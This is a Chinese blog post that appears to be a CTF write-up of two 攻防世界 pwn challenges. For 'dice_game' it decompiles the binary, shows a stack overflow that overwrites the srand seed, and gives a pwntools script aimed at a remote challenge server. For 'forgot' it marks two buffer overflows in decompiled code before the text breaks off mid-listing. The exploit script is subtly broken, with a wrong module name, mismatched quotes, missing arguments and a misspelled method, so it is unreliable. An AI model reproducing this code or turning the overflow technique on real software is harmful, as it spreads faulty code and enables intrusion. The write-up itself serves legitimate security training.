<!doctype html>



  


<html class="theme-next muse use-motion">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">


  <meta name="keywords" content="pwn,">





  <link rel="alternate" href="/atom.xml" title="mutou-jun's blog" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1">






<meta name="description" content="之前已经做过了，但为了共享我尽量把他们放到这里上！这边大概涉及到如何python与C混合编程以及测变量在栈上偏移量的一种方法！">
<meta name="keywords" content="pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界进阶00">
<meta property="og:url" content="http://yoursite.com/2019/11/03/攻防世界进阶00/index.html">
<meta property="og:site_name" content="mutou-jun&#39;s blog">
<meta property="og:description" content="之前已经做过了，但为了共享我尽量把他们放到这里上！这边大概涉及到如何python与C混合编程以及测变量在栈上偏移量的一种方法！">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtaAs.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtdNn.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXttBQ.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtYng.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtGjS.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtB90.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtwhq.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtD3V.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtrcT.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtsjU.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXt6uF.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtcB4.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtRE9.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXtWNR.png">
<meta property="og:image" content="https://s2.ax1x.com/2019/10/12/uXYRN4.png">
<meta property="og:updated_time" content="2019-11-03T07:52:09.324Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="攻防世界进阶00">
<meta name="twitter:description" content="之前已经做过了，但为了共享我尽量把他们放到这里上！这边大概涉及到如何python与C混合编程以及测变量在栈上偏移量的一种方法！">
<meta name="twitter:image" content="https://s2.ax1x.com/2019/11/03/KXtaAs.png">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Muse',
    sidebar: {"position":"right","display":"always"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 0,
      author: '博主'
    }
  };
</script>

  <title> 攻防世界进阶00 | mutou-jun's blog </title>
</head>



   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/src/fireworks.js"></script>


<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-right page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">mutou-jun's blog</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle"></p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                攻防世界进阶00
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2019-11-03T15:48:33+08:00" content="2019-11-03">
              2019-11-03
            </time>
          </span>

          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>之前已经做过了，但为了共享我尽量把他们放到这里上！这边大概涉及到如何python与C混合编程以及测变量在栈上偏移量的一种方法！</p>
<a id="more"></a>

<h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><h3 id="这个程序，有点长得不像pwn！"><a href="#这个程序，有点长得不像pwn！" class="headerlink" title="这个程序，有点长得不像pwn！"></a>这个程序，有点长得不像pwn！</h3><blockquote>
<p>下载下来是个压缩包，解压后里面是一个可执行文件以及一个libc.so.6动态链接库！</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2019/11/03/KXtaAs.png" alt="KXtaAs.png"></p>
<blockquote>
<p>然后checksec，</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2019/11/03/KXtdNn.png" alt="KXtdNn.png"></p>
<blockquote>
<p>fiile一波</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2019/11/03/KXttBQ.png" alt="KXttBQ.png"></p>
<blockquote>
<p>运行下：</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2019/11/03/KXtYng.png" alt="KXtYng.png"></p>
<blockquote>
<p>然后拖入ida查看字符串找到了srand以及经常和他在一起的time函数</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2019/11/03/KXtGjS.png" alt="KXtGjS.png"></p>
<h3 id="大致就是这样，我们分析下main-函数"><a href="#大致就是这样，我们分析下main-函数" class="headerlink" title="大致就是这样，我们分析下main()函数"></a>大致就是这样，我们分析下main()函数</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]            //偏移量：0x50字节</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]        //signed long int    8字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]    //unsigned long int   8字节</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);                       <span class="comment">//但它的空间只有0x30字节</span></span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0L</span>L);                  <span class="comment">//// 四字   即  8字节</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome, let me know your name: "</span>, a2);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);                   <span class="comment">// 所以这里存在栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">49</span> )                               <span class="comment">// 交互  1</span></span><br><span class="line">    buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hi, %s. Let's play a game.\n"</span>, buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Game %d/50\n"</span>, v8);                 <span class="comment">// Game i/50   i初始为  1  循环  50次</span></span><br><span class="line">    v5 = sub_A20();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )                              <span class="comment">// v5 必须让他  等于  1  即sub_A20的返回值  为  1</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_B28((__int64)buf);<span class="comment">//这里其实在服务端获得flag了</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="我们再去看看关键的sub-A20-函数"><a href="#我们再去看看关键的sub-A20-函数" class="headerlink" title="我们再去看看关键的sub_A20()函数"></a>我们再去看看关键的sub_A20()函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me the point(1~6): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);                    <span class="comment">// 交互2      v1我们输入的一字节整数</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">6</span> )</span><br><span class="line">      _assert_fail(<span class="string">"(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)"</span>, <span class="string">"dice_game.c"</span>, <span class="number">0x18</span>u, <span class="string">"dice_game"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v2 )                             <span class="comment">// 有后面逻辑向前推， v1==v2   即可达到pwn的目的</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You win."</span>);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You lost."</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid value!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>到这里其实看的就很明白了，只需我们50次的每一次输入的整数v1 等等与v2即可，于是我们接下来要做的就是使得v2的值可控！这里我们通过覆盖srand[0]的值为0或者1即可！具体可以在网上再深刻了解下srand与rand函数！</p>
</blockquote>
<h3 id="所以我们看下srand-0-以及buff数组在栈上的分布："><a href="#所以我们看下srand-0-以及buff数组在栈上的分布：" class="headerlink" title="所以我们看下srand[0]以及buff数组在栈上的分布："></a>所以我们看下srand[0]以及buff数组在栈上的分布：</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="string">D/A/*</span>   <span class="string">:</span> <span class="string">change</span> <span class="string">type</span> <span class="string">(data/ascii/array)</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="attr">N       :</span> <span class="string">rename</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="attr">U       :</span> <span class="string">undefine</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="string">Use</span> <span class="string">data</span> <span class="string">definition</span> <span class="string">commands</span> <span class="string">to</span> <span class="string">create</span> <span class="string">local</span> <span class="string">variables</span> <span class="string">and</span> <span class="string">function</span> <span class="string">arguments.</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="string">Two</span> <span class="string">special</span> <span class="string">fields</span> <span class="string">" r"</span> <span class="string">and</span> <span class="string">" s"</span> <span class="string">represent</span> <span class="string">return</span> <span class="string">address</span> <span class="string">and</span> <span class="string">saved</span> <span class="string">registers.</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="attr">Frame size:</span> <span class="number">50</span><span class="string">;</span> <span class="attr">Saved regs:</span> <span class="number">8</span><span class="string">;</span> <span class="attr">Purge:</span> <span class="number">0</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span></span><br><span class="line"><span class="number">-0000000000000050</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">buf</span>             <span class="string">db</span> <span class="number">55</span> <span class="string">dup(?)</span></span><br><span class="line"><span class="number">-0000000000000019</span> <span class="string">var_19</span>          <span class="string">db</span> <span class="string">?</span></span><br><span class="line"><span class="number">-0000000000000018</span> <span class="string">var_18</span>          <span class="string">dq</span> <span class="string">?</span></span><br><span class="line"><span class="number">-0000000000000010</span> <span class="string">seed</span>            <span class="string">dd</span> <span class="number">2</span> <span class="string">dup(?)</span>   <span class="string">//这里的seed</span> <span class="string">为srand的种子，我们将它覆盖为0或者1</span></span><br><span class="line"><span class="number">-0000000000000008</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000007</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000006</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000005</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000004</span> <span class="string">var_4</span>           <span class="string">dd</span> <span class="string">?</span></span><br><span class="line"><span class="string">+0000000000000000</span>  <span class="string">s</span>              <span class="string">db</span> <span class="number">8</span> <span class="string">dup(?)</span></span><br><span class="line"><span class="string">+0000000000000008</span>  <span class="string">r</span>              <span class="string">db</span> <span class="number">8</span> <span class="string">dup(?)</span></span><br><span class="line"><span class="string">+0000000000000010</span></span><br><span class="line"><span class="string">+0000000000000010</span> <span class="string">;</span> <span class="string">end</span> <span class="string">of</span> <span class="string">stack</span> <span class="string">variables</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>所以，我们的思路就是<br>通过覆盖掉seed[0],将伪随机产生的是个唯一确定的值，然后通过Python与C的混合编程实现以下脚本</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="keyword">from</span> ctypes import *</span><br><span class="line">content.<span class="attribute">log_level</span>=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#conn=process('./dice_game')</span></span><br><span class="line"><span class="attribute">conn</span>=remote('111.198.29.45","47215')</span><br><span class="line"></span><br><span class="line"><span class="attribute">libc</span>=cdll.LoadLibrary("./libc.so.6")#混合编程的关键步</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span>=<span class="string">'a'</span>*0x40+p64(0)</span><br><span class="line"><span class="comment">#payload='a'*0x40+p64(1)</span></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">'Welcome, let me know your name: '</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(50):</span><br><span class="line">    <span class="attribute">n</span>=libc.rand(0)%6+1#混合编程的关键步</span><br><span class="line">    #<span class="attribute">n</span>=libc.rand(1)%6+1</span><br><span class="line">    conn.sendlineafter(n)</span><br><span class="line">conn.interacter()</span><br></pre></td></tr></table></figure>

<h1 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h1><h3 id="这个程序有两个漏洞，利用任意一个可以达到pwn的目的！"><a href="#这个程序有两个漏洞，利用任意一个可以达到pwn的目的！" class="headerlink" title="这个程序有两个漏洞，利用任意一个可以达到pwn的目的！"></a>这个程序有两个漏洞，利用任意一个可以达到pwn的目的！</h3><blockquote>
<p>首先还是那一套流程：<br>checsec forgot<br><img src="https://s2.ax1x.com/2019/11/03/KXtB90.png" alt="KXtB90.png"><br>简单运行下了解下程序是怎样运行的<br><img src="https://s2.ax1x.com/2019/11/03/KXtwhq.png" alt="KXtwhq.png"><br>拖入ida查看危险函数以及关键符号<img src="https://s2.ax1x.com/2019/11/03/KXtD3V.png" alt="KXtD3V.png"><br>发现可以程序中有可以直接获取flag的文件，加下那个函数地址<img src="https://s2.ax1x.com/2019/11/03/KXtrcT.png" alt="KXtrcT.png"></p>
</blockquote>
<h3 id="ida分析下："><a href="#ida分析下：" class="headerlink" title="ida分析下："></a>ida分析下：</h3><blockquote>
<p>其实这道题没怎么去关心它到底是干嘛的，目的是pwn掉它，攻击就好了！</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h] 注意下这里</span></span><br><span class="line">  <span class="keyword">int</span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+58h] [ebp-2Ch]          与这里</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">1</span>;</span><br><span class="line">  v3 = sub_8048604;</span><br><span class="line">  v4 = sub_8048618;</span><br><span class="line">  v5 = sub_804862C;</span><br><span class="line">  v6 = sub_8048640;</span><br><span class="line">  v7 = sub_8048654;</span><br><span class="line">  v8 = sub_8048668;</span><br><span class="line">  v9 = sub_804867C;</span><br><span class="line">  v10 = sub_8048690;</span><br><span class="line">  v11 = sub_80486A4;</span><br><span class="line">  v12 = sub_80486B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your name?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">32</span>, <span class="built_in">stdin</span>);                         <span class="comment">// 漏洞点   1</span></span><br><span class="line">  sub_80485DD((<span class="keyword">int</span>)&amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"I should give you a pointer perhaps. Here: %x\n\n"</span>, sub_8048654);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the string to be validate"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, v2);                     <span class="comment">// 漏洞点    2</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )</span><br><span class="line">          v14 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v14 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_804874C(v2[i]) )</span><br><span class="line">          v14 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v14 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span 